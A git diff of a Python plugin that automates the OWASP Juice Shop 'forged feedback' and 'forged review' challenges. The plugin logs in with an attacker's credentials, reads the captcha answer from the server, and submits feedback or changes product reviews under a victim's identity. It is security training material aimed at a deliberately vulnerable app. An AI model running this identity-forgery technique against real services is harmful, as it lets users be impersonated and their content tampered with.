@@ -1,3 +1,15 @@
+# SOURCE FILE:    forged.py
+# PROGRAM:        JuiceShop automating attack application -- Plugin
+# FUNCTIONS:      Solve FORGED FEEDBACK & FORGED REVIEW Challenge
+#                 1. using attacker's credential to change victim's product review
+#                 2. using attacker's credential to change victim's feedback
+#
+# DATE:           Dec 6, 2022
+# REVISIONS:      N/A
+# PROGRAMMER:     Yoyo Wang
+#
+# NOTES
+#--------------------------------------------------------------------------------------
 """
 This file is to automate the OWASP JUICESHOP TASK
 FORGED FEEDBACK
@@ -11,27 +23,49 @@ from plugins import attack as a
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+#--------------------------------------------------------------------------------------
+#Class: forged
+#Inherit: attack_inter
+#--------------------------------------------------------------------------------------
 class forged(a.attack_inter):
 
+#--------------------------------------------------------------------------------------
+#FUNCTION: __init__ 
+#ARGUMENTS: N/A
+#RETURNS: void
+#Description: Initial class variables
+#--------------------------------------------------------------------------------------
     def __init__(self, aEmail, vEmail):
+        # REST session
         self.juice_session = a.requests.session()
+        # attacker's email address
         self.email = aEmail
+        # victim's email address
         self.victim_email = vEmail
-        self.set_info()
+        # fake comment
         self.comment = 'I like orange Juice'
+        # fake rating
         self.rating = 5
-
-
-    def set_info(self):
+        # attacker's ID
         self.userid = a.get_userId(self.email)
+        # victim's ID
         self.forgeId = a.get_userId(self.victim_email)
+        # attacker's credential
         self.cookie, self.header = a.get_auth(self.email)
-        self.author = self.victim_email
+        # captcha credential
         self.captchaId, self.captcha, self.captchaAns = self.load_captcha()
 
     def generator(self):
         pass
 
+#--------------------------------------------------------------------------------------
+#FUNCTION load_captcha
+#ARGUMENTS: N/A
+#RETURNS: list[captchaId, captcha, answer]
+#Description: Send a GET request to get captcha info and answer to pass verification
+#             
+#NOTES:
+#--------------------------------------------------------------------------------------
     def load_captcha(self):
         print('-----------------------------------------')
         print('Let us get the captcha ------------------')
@@ -39,6 +73,14 @@ class forged(a.attack_inter):
         response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
         return response.json()["captchaId"], response.json()["captcha"], response.json()["answer"]
 
+#--------------------------------------------------------------------------------------
+#FUNCTION load_captcha
+#ARGUMENTS: N/A
+#RETURNS: N/A
+#Description: Send a POST request to change victim's feedback content
+#             
+#NOTES:
+#--------------------------------------------------------------------------------------
     def forged_feedback(self):
         print("------------------------------------------")
         print("Let us forge other's feedback ------------")
@@ -60,17 +102,33 @@ class forged(a.attack_inter):
             print(response.json()["data"])
         print(response.status_code)
 
+#--------------------------------------------------------------------------------------
+#FUNCTION load_captcha
+#ARGUMENTS: N/A
+#RETURNS: N/A
+#Description: Send a POST request to change victim's product review
+#             
+#NOTES:
+#--------------------------------------------------------------------------------------
     def forged_review(self):
         print("------------------------------------------")
         print("Let us forge other's review --------------")
         url = a.URL + '/rest/products/{}/reviews'.format(self.forgeId)
         json_data = {
             'message': 'I like orange Juice',
-            'author': self.author,
+            'author': self.victim_email,
         }
         response = self.juice_session.put(url, cookies=self.cookie, headers=self.header, json=json_data)
         print(response.text)
 
+#--------------------------------------------------------------------------------------
+#FUNCTION run
+#ARGUMENTS: N/A
+#RETURNS: N/A
+#Description: This is the main function for plugin.
+#             
+#NOTES: None
+#--------------------------------------------------------------------------------------
     def run(self):
         a.logging.basicConfig(filename='./test_logging_info.log', 
                             level=a.logging.INFO, format='%(asctime)s %(message)s')
